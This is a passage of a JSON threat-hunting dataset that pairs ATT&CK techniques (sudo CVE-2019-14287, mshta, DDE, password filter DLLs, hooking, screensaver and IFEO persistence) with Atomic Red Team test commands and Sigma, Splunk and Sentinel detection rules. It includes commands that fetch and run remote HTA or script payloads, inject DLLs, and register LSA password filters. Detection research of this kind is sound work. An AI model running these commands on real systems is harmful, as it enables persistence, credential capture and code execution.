icbc sudo: test321: TTY = pts / 1; PWD = /; USER = # 4294967295; COMMAND = / usr / bin / id", "cat /etc/sudoers", "vim /etc/sudoers"], "attack_paths": [], "queries": [{"product": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "query": "Yml\ntitle: CVE-2019-14287 sudo misconfigured - Privilege Escalation\ndescription:. Ubuntu19.04 x64 test results (when sudo when configured to allow users to run any user command, the user can press to become root by specifying the user ID-1 or 4,294,967,295 has sufficient privileges sudo Runas specification keyword ALL users can use it to run commands as root, even if the specification is expressly prohibited Runas root access, as long as the specification Runas\n\u00a0Conditions listed first in the keyword ALL can)\nreferences: https://sysdig.com/blog/detecting-cve-2019-14287/\ntags: T1169\nstatus: experimental\nauthor: Blue team\nlogsource:\n\u00a0\u00a0\u00a0\u00a0product: linux\ndetection:\n\u00a0\u00a0\u00a0\u00a0selection:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0proc.name: 'sudo:'\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0proc.USER:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0- '#-1'\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0- '# 4294967295'\n\u00a0\u00a0\u00a0\u00a0condition: selection\nlevel: medium", "name": "Yml"}, {"product": "Splunk", "query": "index=linux sourcetype=\"linux_audit\" sudoers_change", "name": null}, {"product": "Splunk", "query": "Audit Rule : -w /etc/sudoers -p wa -k sudoers_change", "name": null}], "possible_detections": [{"data_source": "auditlogs (audit.rules)"}, {"data_source": "bash_history logs"}, {"data_source": {"action": "global", "title": "Sudo Privilege Escalation CVE-2019-14287", "id": "f74107df-b6c6-4e80-bf00-4170b658162b", "status": "experimental", "description": "Detects users trying to exploit sudo vulnerability reported in CVE-2019-14287", "references": ["https://www.openwall.com/lists/oss-security/2019/10/14/1", "https://access.redhat.com/security/cve/cve-2019-14287", "https://twitter.com/matthieugarin/status/1183970598210412546"], "author": "Florian Roth", "date": "2019/10/15", "modified": "2019/10/20", "tags": ["attack.privilege_escalation", "attack.t1068", "attack.t1169"], "logsource": {"product": "linux"}, "falsepositives": ["Unlikely"], "level": "critical"}}, {"data_source": {"detection": {"selection_keywords": ["* -u#*"], "condition": "selection_keywords"}}}, {"data_source": {"detection": {"selection_user": {"USER": ["#-*", "#*4294967295"]}, "condition": "selection_user"}}}]}, {"technique_id": "T1170", "commands": [{"source": "atomics/T1170/T1170.yaml", "command": "mshta.exe javascript:a=(GetObject('script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1170/src/mshta.sct')).Exec();close();\n", "name": null}, {"source": "atomics/T1170/T1170.yaml", "command": "mshta vbscript:Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run \"\"powershell -noexit -file PathToAtomicsFolder\\T1170\\src\\powershell.ps1\"\":close\")\n", "name": null}, {"source": "atomics/T1170/T1170.yaml", "command": "$var =Invoke-WebRequest \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1170/src/T1170.hta\"\n$var.content|out-file \"#{temp_file}\"\nmshta \"#{temp_file}\"\n", "name": null}, {"source": "atomics/T1170/T1170.yaml", "command": "$var =Invoke-WebRequest \"#{hta_url}\"\n$var.content|out-file \"$env:appdata\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\T1170.hta\"\nmshta \"$env:appdata\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\T1170.hta\"\n", "name": null}, {"source": "SysmonHunter - Mshta", "command": "\\\\windows\\\\.+\\\\mshta.exevbscript|javascript|http|https", "name": null}], "parsed_datasets": [{"Atomic Red Team Test - Mshta": {"attack_technique": "T1170", "display_name": "Mshta", "atomic_tests": [{"name": "Mshta executes JavaScript Scheme Fetch Remote Payload With GetObject", "description": "Test execution of a remote script using mshta.exe. Upon execution calc.exe will be launched.\n", "supported_platforms": ["windows"], "input_arguments": {"file_url": {"description": "location of the payload", "type": "Url", "default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1170/src/mshta.sct"}}, "executor": {"name": "command_prompt", "elevation_required": false, "command": "mshta.exe javascript:a=(GetObject('script:#{file_url}')).Exec();close();\n"}}, {"name": "Mshta executes VBScript to execute malicious command", "description": "Run a local VB script to run local user enumeration powershell command.\nThis attempts to emulate what FIN7 does with this technique which is using mshta.exe to execute VBScript to execute malicious code on victim systems.\nUpon execution, a new PowerShell windows will be opened that displays user information.\n", "supported_platforms": ["windows"], "executor": {"name": "command_prompt", "command": "mshta vbscript:Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run \"\"powershell -noexit -file PathToAtomicsFolder\\T1170\\src\\powershell.ps1\"\":close\")\n"}}, {"name": "Mshta Executes Remote HTML Application (HTA)", "description": "Execute an arbitrary remote HTA. Upon execution calc.exe will be launched.\n", "supported_platforms": ["windows"], "input_arguments": {"hta_url": {"description": "URL to HTA file for execution", "type": "string", "default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1170/src/T1170.hta"}, "temp_file": {"description": "temp_file location for hta", "type": "string", "default": "$env:appdata\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\T1170.hta"}}, "executor": {"name": "powershell", "command": "$var =Invoke-WebRequest \"#{hta_url}\"\n$var.content|out-file \"#{temp_file}\"\nmshta \"#{temp_file}\"\n", "cleanup_command": "remove-item \"#{temp_file}\" -ErrorAction Ignore\n"}}]}}, {"SysmonHunter - T1170": {"name": "Mshta", "description": null, "level": "medium", "phase": "Execution", "query": [{"type": "process", "process": {"image": {"pattern": "\\\\windows\\\\.+\\\\mshta.exe", "flag": "regex"}, "cmdline": {"pattern": "vbscript|javascript|http|https"}}}]}}], "command_list": ["mshta.exe javascript:a=(GetObject('script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1170/src/mshta.sct')).Exec();close();\n", "mshta vbscript:Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run \"\"powershell -noexit -file PathToAtomicsFolder\\T1170\\src\\powershell.ps1\"\":close\")\n", "$var =Invoke-WebRequest \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1170/src/T1170.hta\"\n$var.content|out-file \"#{temp_file}\"\nmshta \"#{temp_file}\"\n", "$var =Invoke-WebRequest \"#{hta_url}\"\n$var.content|out-file \"$env:appdata\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\T1170.hta\"\nmshta \"$env:appdata\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\T1170.hta\"\n", "\\\\windows\\\\.+\\\\mshta.exevbscript|javascript|http|https"], "attack_paths": [], "queries": [{"product": "Azure Sentinel", "query": "Sysmon| where (EventID == 11 or EventID == 15)and file_name contains \".hta\"", "name": "MSHTA FileAccess"}, {"product": "Azure Sentinel", "query": "Sysmon| where EventID == 3and (process_command_line contains \"mshta.exe\"or process_parent_command_line contains \"mshta.exe\")", "name": "MSHTA Network"}, {"product": "Azure Sentinel", "query": "Sysmon| where EventID == 1and (process_command_line contains \"mshta.exe\"or process_parent_command_line contains \"mshta.exe\")", "name": "MSHTA Process"}], "possible_detections": [{"data_source": {"title": "Baby Shark Activity", "id": "2b30fa36-3a18-402f-a22d-bf4ce2189f35", "status": "experimental", "description": "Detects activity that could be related to Baby Shark malware", "references": ["https://unit42.paloaltonetworks.com/new-babyshark-malware-targets-u-s-national-security-think-tanks/"], "tags": ["attack.execution", "attack.t1059", "attack.t1086", "attack.discovery", "attack.t1012", "attack.defense_evasion", "attack.t1170"], "logsource": {"category": "process_creation", "product": "windows"}, "author": "Florian Roth", "date": "2019/02/24", "detection": {"selection": {"CommandLine": ["reg query \"HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Default\"", "powershell.exe mshta.exe http*", "cmd.exe /c taskkill /im cmd.exe"]}, "condition": "selection"}, "falsepositives": ["unknown"], "level": "high"}}, {"data_source": {"title": "MSHTA spwaned by SVCHOST as seen in LethalHTA", "id": "ed5d72a6-f8f4-479d-ba79-02f6a80d7471", "status": "experimental", "description": "Detects MSHTA.EXE spwaned by SVCHOST described in report", "references": ["https://codewhitesec.blogspot.com/2018/07/lethalhta.html"], "tags": ["attack.defense_evasion", "attack.execution", "attack.t1170"], "author": "Markus Neis", "date": "2018/06/07", "logsource": {"category": "process_creation", "product": "windows"}, "detection": {"selection": {"ParentImage": "*\\svchost.exe", "Image": "*\\mshta.exe"}, "condition": "selection"}, "falsepositives": ["Unknown"], "level": "high"}}, {"data_source": {"title": "MSHTA Spawning Windows Shell", "id": "03cc0c25-389f-4bf8-b48d-11878079f1ca", "status": "experimental", "description": "Detects a Windows command line executable started from MSHTA.", "references": ["https://www.trustedsec.com/july-2015/malicious-htas/"], "author": "Michael Haag", "logsource": {"category": "process_creation", "product": "windows"}, "detection": {"selection": {"ParentImage": "*\\mshta.exe", "Image": ["*\\cmd.exe", "*\\powershell.exe", "*\\wscript.exe", "*\\cscript.exe", "*\\sh.exe", "*\\bash.exe", "*\\reg.exe", "*\\regsvr32.exe", "*\\BITSADMIN*"]}, "condition": "selection"}, "fields": ["CommandLine", "ParentCommandLine"], "tags": ["attack.defense_evasion", "attack.execution", "attack.t1170", "car.2013-02-003", "car.2013-03-001", "car.2014-04-003"], "falsepositives": ["Printer software / driver installations", "HP software"], "level": "high"}}, {"data_source": {"title": "Possible Applocker Bypass", "id": "82a19e3a-2bfe-4a91-8c0d-5d4c98fbb719", "description": "Detects execution of executables that can be used to bypass Applocker whitelisting", "status": "experimental", "references": ["https://github.com/subTee/ApplicationWhitelistBypassTechniques/blob/master/TheList.txt", "https://room362.com/post/2014/2014-01-16-application-whitelist-bypass-using-ieexec-dot-exe/"], "author": "juju4", "tags": ["attack.defense_evasion", "attack.t1118", "attack.t1121", "attack.t1127", "attack.t1170"], "logsource": {"category": "process_creation", "product": "windows"}, "detection": {"selection": {"CommandLine|contains": ["\\msdt.exe", "\\installutil.exe", "\\regsvcs.exe", "\\regasm.exe", "\\msbuild.exe", "\\ieexec.exe"]}, "condition": "selection"}, "falsepositives": ["False positives depend on scripts and administrative tools used in the monitored environment", "Using installutil to add features for .NET applications (primarly would occur in developer environments)"], "level": "low"}}]}, {"technique_id": "T1173", "commands": [{"source": "atomics/T1173/T1173.yaml", "command": "start $PathToAtomicsFolder\\T1173\\bin\\DDE_Document.docx\n", "name": null}], "parsed_datasets": [{"Atomic Red Team Test - Dynamic Data Exchange": {"attack_technique": "T1173", "display_name": "Dynamic Data Exchange", "atomic_tests": [{"name": "Execute Commands", "description": "Executes commands via DDE using Microsfot Word\n", "supported_platforms": ["windows"], "executor": {"name": "manual", "steps": "Open Microsoft Word\n\nInsert tab -> Quick Parts -> Field\n\nChoose = (Formula) and click ok.\n\nAfter that, you should see a Field inserted in the document with an error \"!Unexpected End of Formula\", right-click the Field, and choose Toggle Field Codes.\n\nThe Field Code should now be displayed, change it to Contain the following:\n\n{DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe \"/k calc.exe\"  }\n"}}, {"name": "Execute PowerShell script via Word DDE", "description": "When the word document opens it will prompt the user to click ok on a dialogue box, then attempt to run PowerShell with DDEAUTO to download and execute a powershell script\n", "supported_platforms": ["windows"], "executor": {"name": "command_prompt", "elevation_required": false, "command": "start $PathToAtomicsFolder\\T1173\\bin\\DDE_Document.docx\n"}}]}}], "command_list": ["start $PathToAtomicsFolder\\T1173\\bin\\DDE_Document.docx\n"], "attack_paths": [], "queries": [], "possible_detections": []}, {"technique_id": "T1174", "commands": [{"source": "atomics/T1174/T1174.yaml", "command": "$passwordFilterName = (Copy-Item \"PathToAtomicsFolder\\T1174\\src\\AtomicPasswordFilter.dll\" -Destination \"C:\\Windows\\System32\" -PassThru).basename\n$lsaKey = Get-Item \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\\"\n$notificationPackagesValues = $lsaKey.GetValue(\"Notification Packages\")\n$notificationPackagesValues += $passwordFilterName\nSet-ItemProperty \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\\" \"Notification Packages\" $notificationPackagesValues\nRestart-Computer -Confirm\n", "name": null}], "parsed_datasets": [{"Atomic Red Team Test - Password Filter DLL": {"attack_technique": "T1174", "display_name": "Password Filter DLL", "atomic_tests": [{"name": "Install and Register Password Filter DLL", "description": "Uses PowerShell to install and register a password filter DLL. Requires a reboot and administrative privileges.\n", "supported_platforms": ["windows"], "input_arguments": {"input_dll": {"description": "Path to DLL to be installed and registered", "type": "Path", "default": "PathToAtomicsFolder\\T1174\\src\\AtomicPasswordFilter.dll"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "AtomicPasswordFilter.dll must exist on disk at specified location (#{input_dll})\n", "prereq_command": "if (Test-Path #{input_dll}) {exit 0} else {exit 1}\n", "get_prereq_command": "Write-Host \"You must provide your own password filter dll\"\n"}], "executor": {"name": "powershell", "elevation_required": true, "command": "$passwordFilterName = (Copy-Item \"#{input_dll}\" -Destination \"C:\\Windows\\System32\" -PassThru).basename\n$lsaKey = Get-Item \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\\"\n$notificationPackagesValues = $lsaKey.GetValue(\"Notification Packages\")\n$notificationPackagesValues += $passwordFilterName\nSet-ItemProperty \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\\" \"Notification Packages\" $notificationPackagesValues\nRestart-Computer -Confirm\n"}}]}}], "command_list": ["$passwordFilterName = (Copy-Item \"PathToAtomicsFolder\\T1174\\src\\AtomicPasswordFilter.dll\" -Destination \"C:\\Windows\\System32\" -PassThru).basename\n$lsaKey = Get-Item \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\\"\n$notificationPackagesValues = $lsaKey.GetValue(\"Notification Packages\")\n$notificationPackagesValues += $passwordFilterName\nSet-ItemProperty \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\\" \"Notification Packages\" $notificationPackagesValues\nRestart-Computer -Confirm\n"], "attack_paths": [], "queries": [], "possible_detections": []}, {"technique_id": "T1176", "commands": [], "parsed_datasets": [{"Atomic Red Team Test - Browser Extensions": {"attack_technique": "T1176", "display_name": "Browser Extensions", "atomic_tests": [{"name": "Chrome (Developer Mode)", "description": "", "supported_platforms": ["linux", "windows", "macos"], "executor": {"name": "manual", "steps": "1. Navigate to [chrome://extensions](chrome://extensions) and\ntick 'Developer Mode'.\n\n2. Click 'Load unpacked extension...' and navigate to\n[Browser_Extension](../t1176/)\n\n3. Click 'Select'\n"}}, {"name": "Chrome (Chrome Web Store)", "description": "", "supported_platforms": ["linux", "windows", "macos"], "executor": {"name": "manual", "steps": "1. Navigate to https://chrome.google.com/webstore/detail/minimum-viable-malicious/odlpfdolehmhciiebahbpnaopneicend\nin Chrome\n\n2. Click 'Add to Chrome'\n"}}, {"name": "Firefox", "description": "Create a file called test.wma, with the duration of 30 seconds\n", "supported_platforms": ["linux", "windows", "macos"], "executor": {"name": "manual", "steps": "1. Navigate to [about:debugging](about:debugging) and\nclick \"Load Temporary Add-on\"\n\n2. Navigate to [manifest.json](./src/manifest.json)\n\n3. Then click 'Open'\n"}}, {"name": "Edge Chromium Addon - VPN", "description": "Adversaries may use VPN extensions in an attempt to hide traffic sent from a compromised host. This will install one (of many) available VPNS in the Edge add-on store.\n", "supported_platforms": ["windows", "macos"], "executor": {"name": "manual", "steps": "1. Navigate to https://microsoftedge.microsoft.com/addons/detail/fjnehcbecaggobjholekjijaaekbnlgj\nin Edge Chromium\n\n2. Click 'Get'\n", "cleanup": "1. Navigate to \"...\" menu in top right of browser and select.\n2. In drop down, click on \"Extensions\".\n3. Remove the Extension."}}]}}], "command_list": [], "attack_paths": [], "queries": [], "possible_detections": []}, {"technique_id": "T1179", "commands": [{"source": "atomics/T1179/T1179.yaml", "command": "mavinject $pid /INJECTRUNNING PathToAtomicsFolder\\T1179\\bin\\T1179x64.dll\ncurl #{server_name}\n", "name": null}, {"source": "atomics/T1179/T1179.yaml", "command": "mavinject $pid /INJECTRUNNING #{file_name}\ncurl https://www.example.com\n", "name": null}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/collection/netripper", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/collection/netripper", "name": "Empire Module Command"}], "parsed_datasets": [{"Atomic Red Team Test - Hooking": {"attack_technique": "T1179", "display_name": "Hooking", "atomic_tests": [{"name": "Hook PowerShell TLS Encrypt/Decrypt Messages", "description": "Hooks functions in PowerShell to read TLS Communications\n", "supported_platforms": ["windows"], "input_arguments": {"file_name": {"description": "Dll To Inject", "type": "Path", "default": "PathToAtomicsFolder\\T1179\\bin\\T1179x64.dll"}, "server_name": {"description": "TLS Server To Test Get Request", "type": "Url", "default": "https://www.example.com"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "T1179x64.dll must exist on disk at specified location (#{file_name})\n", "prereq_command": "if (Test-Path #{file_name}) {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory (split-path #{file_name}) -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1179/bin/T1179x64.dll\" -OutFile \"#{file_name}\"\n"}], "executor": {"name": "powershell", "elevation_required": true, "command": "mavinject $pid /INJECTRUNNING #{file_name}\ncurl #{server_name}\n"}}]}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/collection/netripper", "ATT&CK Technique #1": "T1179", "ATT&CK Technique #2": "", "Technique": "Hooking", "Concatenate for Python Dictionary": "\"powershell/collection/netripper\":  [\"T1179\"],"}}], "command_list": ["mavinject $pid /INJECTRUNNING PathToAtomicsFolder\\T1179\\bin\\T1179x64.dll\ncurl #{server_name}\n", "mavinject $pid /INJECTRUNNING #{file_name}\ncurl https://www.example.com\n", "powershell/collection/netripper", "powershell/collection/netripper"], "attack_paths": [], "queries": [{"product": "Azure Sentinel", "query": "Sysmon| where EventID == 1and (process_path contains \"mavinject.exe\"or process_command_line contains \"/INJECTRUNNING\")", "name": "Hooking"}], "possible_detections": []}, {"technique_id": "T1180", "commands": [{"source": "atomics/T1180/T1180.yaml", "command": "copy C:\\Windows\\System32\\cmd.exe \"%SystemRoot%\\System32\\evilscreensaver.scr\"\nreg.exe add \"HKEY_CURRENT_USER\\Control Panel\\Desktop\" /v ScreenSaveActive /t REG_SZ /d 1 /f\nreg.exe add \"HKEY_CURRENT_USER\\Control Panel\\Desktop\" /v ScreenSaveTimeout /t REG_SZ /d 60 /f\nreg.exe add \"HKEY_CURRENT_USER\\Control Panel\\Desktop\" /v ScreenSaverIsSecure /t REG_SZ /d 0 /f\nreg.exe add \"HKEY_CURRENT_USER\\Control Panel\\Desktop\" /v SCRNSAVE.EXE /t REG_SZ /d \"%SystemRoot%\\System32\\evilscreensaver.scr\" /f\nshutdown /r /t 0\n", "name": null}, {"source": "SysmonHunter - Screensaver", "command": "Control Panel\\Desktop\\SCRNSAVE.EXE", "name": null}, {"source": "SysmonHunter - Screensaver", "command": "Control Panel\\Desktop\\SCRNSAVE.EXE", "name": null}], "parsed_datasets": [{"Atomic Red Team Test - Screensaver": {"attack_technique": "T1180", "display_name": "Screensaver", "atomic_tests": [{"name": "Set Arbitrary Binary as Screensaver", "description": "This test copies a binary into the Windows System32 folder and sets it as the screensaver so it will execute for persistence. Requires a reboot and logon.\n", "supported_platforms": ["windows"], "input_arguments": {"input_binary": {"description": "Executable binary to use in place of screensaver for persistence", "type": "path", "default": "C:\\Windows\\System32\\cmd.exe"}}, "executor": {"name": "command_prompt", "elevation_required": true, "command": "copy #{input_binary} \"%SystemRoot%\\System32\\evilscreensaver.scr\"\nreg.exe add \"HKEY_CURRENT_USER\\Control Panel\\Desktop\" /v ScreenSaveActive /t REG_SZ /d 1 /f\nreg.exe add \"HKEY_CURRENT_USER\\Control Panel\\Desktop\" /v ScreenSaveTimeout /t REG_SZ /d 60 /f\nreg.exe add \"HKEY_CURRENT_USER\\Control Panel\\Desktop\" /v ScreenSaverIsSecure /t REG_SZ /d 0 /f\nreg.exe add \"HKEY_CURRENT_USER\\Control Panel\\Desktop\" /v SCRNSAVE.EXE /t REG_SZ /d \"%SystemRoot%\\System32\\evilscreensaver.scr\" /f\nshutdown /r /t 0\n"}}]}}, {"SysmonHunter - T1180": {"name": "Screensaver", "description": null, "level": "medium", "phase": "Persistence", "query": [{"type": "reg", "reg": {"path": {"pattern": "Control Panel\\Desktop\\SCRNSAVE.EXE"}}}, {"type": "process", "process": {"cmdline": {"pattern": "Control Panel\\Desktop\\SCRNSAVE.EXE"}}}]}}], "command_list": ["copy C:\\Windows\\System32\\cmd.exe \"%SystemRoot%\\System32\\evilscreensaver.scr\"\nreg.exe add \"HKEY_CURRENT_USER\\Control Panel\\Desktop\" /v ScreenSaveActive /t REG_SZ /d 1 /f\nreg.exe add \"HKEY_CURRENT_USER\\Control Panel\\Desktop\" /v ScreenSaveTimeout /t REG_SZ /d 60 /f\nreg.exe add \"HKEY_CURRENT_USER\\Control Panel\\Desktop\" /v ScreenSaverIsSecure /t REG_SZ /d 0 /f\nreg.exe add \"HKEY_CURRENT_USER\\Control Panel\\Desktop\" /v SCRNSAVE.EXE /t REG_SZ /d \"%SystemRoot%\\System32\\evilscreensaver.scr\" /f\nshutdown /r /t 0\n", "Control Panel\\Desktop\\SCRNSAVE.EXE", "Control Panel\\Desktop\\SCRNSAVE.EXE"], "attack_paths": [], "queries": [{"product": "Azure Sentinel", "query": "Sysmon| where (EventID == 12 or EventID == 13 or EventID == 14)and (registry_key_path contains \"*\\\\Control Panel\\\\Desktop\\\\SCRNSAVE.EXE\")and (process_parent_command_line !contains \"explorer.exe\"or process_path !contains \"rundll32.exe\"or process_command_line !contains \"*shell32.dll,Control_RunDLL desk.cpl,ScreenSaver,*\")", "name": "Screensaver"}], "possible_detections": []}, {"technique_id": "T1183", "commands": [{"source": "atomics/T1183/T1183.yaml", "command": "REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\C:\\Windows\\System32\\calc.exe\" /v Debugger /d \"#{payload_binary}\"\n", "name": null}, {"source": "atomics/T1183/T1183.yaml", "command": "REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\#{target_binary}\" /v Debugger /d \"C:\\Windows\\System32\\cmd.exe\"\n", "name": null}, {"source": "atomics/T1183/T1183.yaml", "command": "REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\C:\\Windows\\System32\\notepad.exe\" /v GlobalFlag /t REG_DWORD /d 512\nREG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\C:\\Windows\\System32\\notepad.exe\" /v ReportingMode /t REG_DWORD /d 1\nREG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\C:\\Windows\\System32\\notepad.exe\" /v MonitorProcess /d \"#{payload_binary}\"\n", "name": null}, {"source": "atomics/T1183/T1183.yaml", "command": "REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\#{target_binary}\" /v GlobalFlag /t REG_DWORD /d 512\nREG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\#{target_binary}\" /v ReportingMode /t REG_DWORD /d 1\nREG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\#{target_binary}\" /v MonitorProcess /d \"C:\\Windows\\System32\\cmd.exe\"\n", "name": null}, {"source": "SysmonHunter - Image File Execution Options Injection", "command": "Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\|SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit", "name": null}, {"source": "SysmonHunter - Image File Execution Options Injection", "command": "Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\|SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit", "name": null}], "parsed_datasets": [{"Atomic Red Team Test - Image File Execution Options": {"attack_technique": "T1183", "display_name": "Image File Execution Options", "atomic_tests": [{"name": "IFEO Add Debugger", "description": "Leverage Global Flags Settings\n", "supported_platforms": ["windows"], "input_arguments": {"target_binary": {"description": "Binary To Attach To", "type": "Path", "default": "C:\\Windows\\System32\\calc.exe"}, "payload_binary": {"description": "Binary To Execute", "type": "Path", "default": "C:\\Windows\\System32\\cmd.exe"}}, "executor": {"name": "command_prompt", "elevation_required": true, "command": "REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\#{target_binary}\" /v Debugger /d \"#{payload_binary}\"\n", "cleanup_command": "reg delete \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\#{target_binary}\" /v Debugger /f >nul 2>&1\n"}}, {"name": "IFEO Global Flags", "description": "Leverage Global Flags Settings\n", "supported_platforms": ["windows"], "input_arguments": {"target_binary": {"description": "Binary To Attach To", "type": "Path", "default": "C:\\Windows\\System32\\notepad.exe"}, "payload_binary": {"description": "Binary To Execute", "type": "Path", "default": "C:\\Windows\\System32\\cmd.exe"}}, "executor": {"name": "command_prompt", "elevation_required": true, "command": "REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\#{target_binary}\" /v GlobalFlag /t REG_DWORD /d 512\nREG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\#{target_binary}\" /v ReportingMode /t REG_DWORD /d 1\nREG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\#{target_binary}\" /v MonitorProcess /d \"#{payload_binary}\"\n", "cleanup_command": "reg delete \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\#{target_binary}\" /v GlobalFlag /f >nul 2>&1\nreg delete \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\#{target_binary}\" /v ReportingMode /f >nul 2>&1\nreg delete \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\#{target_binary}\" /v MonitorProcess /f >nul 2>&1\n"}}]}}, {"SysmonHunter - T1183": {"name": "Image File Execution Options Injection", "description": null, "level": "medium", "phase": "Persistence", "query": [{"type": "reg", "reg": {"path": {"pattern": "Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\|SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit"}}}, {"type": "process", "process": {"cmdline": {"pattern": "Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\|SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit"}}}]}}], "command_list": ["REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\C:\\Windows\\System32\\calc.exe\" /v Debugger /d \"#{payload_binary}\"\n", "REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\#{target_binary}\" /v Debugger /d \"C:\\Windows\\System32\\cmd.exe\"\n", "REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\C:\\Windows\\System32\\notepad.exe\" /v GlobalFlag /t REG_DWORD /d 512\nREG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\C:\\Windows\\System32\\notepad.exe\" /v ReportingMode /t REG_DWORD /d 1\nREG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\C:\\Windows\\System32\\notepad.exe\" /v MonitorProcess /d \"#{payload_binary}\"\n", "REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\#{target_binary}\" /v GlobalFlag /t REG_DWORD /d 512\nREG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\#{target_binary}\" /v ReportingMode /t REG_DWORD /d 1\nREG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\#{target_binary}\" /v MonitorProcess /d \"C:\\Windows\\System32\\cmd.exe\"\n", "Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\|SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit", "Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\|SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit"], "attack_paths": [], "queries": [{"product": "Azure Sentinel", "query": "Sysmon| where (EventID == 12 or EventID == 13 or EventID == 14)and (registry_key_path contains \"\\\\Software\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Image File Execution Options\\\\\"or registry_key_path contains \"\\\\Wow6432Node\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Image File Execution Options\\\\\")", "name": "Image File Execution Options Injection"}], "possible_detections": [{"data_source": {"title": "Registry Persistence Mechanisms", "id": "36803969-5421-41ec-b92f-8500f79c23b0", "description": "Detects persistence registry keys", "references": 